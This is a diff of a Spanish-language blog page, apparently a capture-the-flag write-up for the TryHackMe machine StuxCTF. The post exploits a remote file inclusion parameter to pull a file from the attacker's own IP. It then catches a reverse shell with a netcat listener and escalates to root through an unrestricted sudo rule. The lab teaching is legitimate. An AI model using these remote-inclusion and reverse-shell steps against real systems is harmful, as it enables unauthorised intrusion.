-</code></pre></div><ol start=3><li></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl http://stuxctf.thm/473150289372648955391313281766843507325770399840230051892039938856873289<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>77050807800832928198526567069446044422855055/<span style=color:#ae81ff>\?</span>file<span style=color:#ae81ff>\=</span>http://your_TUN0_IP/not_a_shell.txt
+</code></pre></div><ol start=3>
+<li></li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl http://stuxctf.thm/473150289372648955391313281766843507325770399840230051892039938856873289<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>77050807800832928198526567069446044422855055/<span style=color:#ae81ff>\?</span>file<span style=color:#ae81ff>\=</span>http://your_TUN0_IP/not_a_shell.txt
 File no Exist!&lt;!DOCTYPE html&gt;
     &lt;head&gt;
         &lt;title&gt;StuxCTF&lt;/title&gt;
 <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
-</code></pre></div><ol start=4><li></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
+</code></pre></div><ol start=4>
+<li></li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
 listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
-</code></pre></div><ol start=5><li></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl http://stuxctf.thm/473150289372648955391313281766843507325770399840230051892039938856873289<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>77050807800832928198526567069446044422855055/this_is_totally_not_a_shell.php
-</code></pre></div><p>Finalmente Beneficio.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
+</code></pre></div><ol start=5>
+<li></li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl http://stuxctf.thm/473150289372648955391313281766843507325770399840230051892039938856873289<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>77050807800832928198526567069446044422855055/this_is_totally_not_a_shell.php
+</code></pre></div><p>Finalmente Beneficio.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
 listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
 connect to <span style=color:#f92672>[</span>10.9.2.251<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.250.63<span style=color:#f92672>]</span> <span style=color:#ae81ff>57118</span>
 /bin/sh: 0: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
 $ id
 uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
 $ 
-</code></pre></div><p>¡Perfecto!</p><p>Ahora tenemos una shell reversa con el usuario <code>www-data</code>.</p><p>Mejoremos la shell con Python.</p><p>Ahora podemos leer la flag del usuario.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ubuntu:/home/grecia$ cat user.txt 
+</code></pre></div><p>¡Perfecto!</p>
+<p>Ahora tenemos una shell reversa con el usuario <code>www-data</code>.</p>
+<p>Mejoremos la shell con Python.</p>
+<p>Ahora podemos leer la flag del usuario.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ubuntu:/home/grecia$ cat user.txt 
 <span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>
-</code></pre></div><h2 id=root>Root</h2><p>Ejecutamos <code>sudo -l</code> para ver si el usuario está dentro de los sudoers, y obtenemos el siguiente resultado:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ubuntu:/home/grecia$ sudo -l
+</code></pre></div><h2 id=root>Root</h2>
+<p>Ejecutamos <code>sudo -l</code> para ver si el usuario está dentro de los sudoers, y obtenemos el siguiente resultado:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ubuntu:/home/grecia$ sudo -l
 Matching Defaults entries <span style=color:#66d9ef>for</span> www-data on ubuntu:
     env_reset, mail_badpass,
     secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
 
 User www-data may run the following commands on ubuntu:
     <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: ALL
-</code></pre></div><p>¡WOW!</p><p>Podemos escalar a root simplemente ejecutando <code>sudo su</code> !!!!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ubuntu:/home/grecia$ sudo su
+</code></pre></div><p>¡WOW!</p>
+<p>Podemos escalar a root simplemente ejecutando <code>sudo su</code> !!!!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ubuntu:/home/grecia$ sudo su
 root@ubuntu:/home/grecia# cat /root/root.txt 
 <span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>
-</code></pre></div><p>¡Y hemos rooteado la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Leer otros posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=/es/posts/thm-pre-security/><span class=button__icon>←</span>
-<span class=button__text>Hackea Tu Forma De Aprender - THM</span></a></span>
-<span class="button next"><a href=/es/posts/develpy/><span class=button__text>Develpy - Write Up - Español</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user">Lanfran02</div></div></footer><script src=/assets/main.js></script><script src=/assets/prism.js></script></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script></body></html>
+</code></pre></div><p>¡Y hemos rooteado la máquina!</p>
+<p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Leer otros posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=/es/posts/thm-pre-security/>
+<span class=button__icon>←</span>
+<span class=button__text>Hackea Tu Forma De Aprender - THM</span>
+</a>
+</span>
+<span class="button next">
+<a href=/es/posts/develpy/>
+<span class=button__text>Develpy - Write Up - Español</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user">Lanfran02</div>
+</div>
+</footer>
+<script src=/assets/main.js></script>
+<script src=/assets/prism.js></script>
+</div>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+</body>
+</html>
